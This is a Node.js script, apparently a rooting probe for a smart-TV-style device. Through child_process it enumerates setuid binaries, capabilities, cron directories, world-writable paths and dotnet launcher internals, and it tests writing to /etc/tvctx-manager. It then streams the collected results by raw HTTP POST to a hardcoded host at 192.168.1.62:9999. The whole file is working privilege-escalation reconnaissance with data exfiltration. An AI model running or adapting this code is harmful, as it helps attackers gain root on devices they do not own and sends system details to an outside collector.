"use strict";
/* p16: root mechanism census + dotnet invocation reference */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p16', results: {}, log: [] };
function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try { return cp.execSync(cmd, { timeout: timeout || 20000, maxBuffer: 16*1024*1024 }).toString().trim(); }
  catch (e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString(); return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text) {
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},60000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}

R.results.setuid = run('find / -perm -4000 -type f 2>/dev/null | head -40', 60000);
R.results.capsetuid = run('getcap -r /usr 2>/dev/null | head -40; echo ---; getcap -r /bin /sbin /usr/sbin /usr/bin 2>/dev/null | head -40', 60000);
R.results.root_cron = run('ls -la /etc/cron* /var/spool/cron* /var/spool/cron/crontabs 2>&1 | head -40', 20000);
R.results.root_ww_dirs = run('find / -perm -0002 -type d 2>/dev/null | grep -vE "^/(proc|sys|dev|home/owner)" | head -25', 60000);
R.results.root_ww_files = run('find / -perm -0002 -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|home/owner|tmp)" | head -25', 60000);
R.results.tvctx = run('ls -la /etc/tvctx-manager/ 2>&1', 15000);
R.results.tvctx_seed_write = run('touch /etc/tvctx-manager/owner_seed_probe 2>&1 && echo SEED_WRITE_OK || echo SEED_WRITE_FAIL', 10000);
R.results.dotnet_run_ni = run('cat /usr/bin/dotnet-run-ni.sh 2>&1 | head -60', 15000);
R.results.dotnet_help = run('/usr/bin/dotnet-launcher --help 2>&1; echo ---; /usr/bin/dotnet-launcher -h 2>&1', 15000);
R.results.specific_bins = run('ls -la /usr/bin/su /bin/su /usr/bin/sudo /usr/bin/crontab /usr/bin/cron /usr/sbin/cron /usr/bin/at /usr/bin/wasutility /usr/bin/RunningAppsService /bin/sh 2>&1', 15000);
R.results.dnet_caps = run('getcap /usr/bin/dotnet-launcher /usr/bin/dotnet-launcher-inhouse /usr/bin/wasutility /usr/bin/RunningAppsService 2>/dev/null', 15000);
R.results.final = 'done '+new Date().toISOString();
postRaw('/p16info', JSON.stringify(R));
L('p16 done');
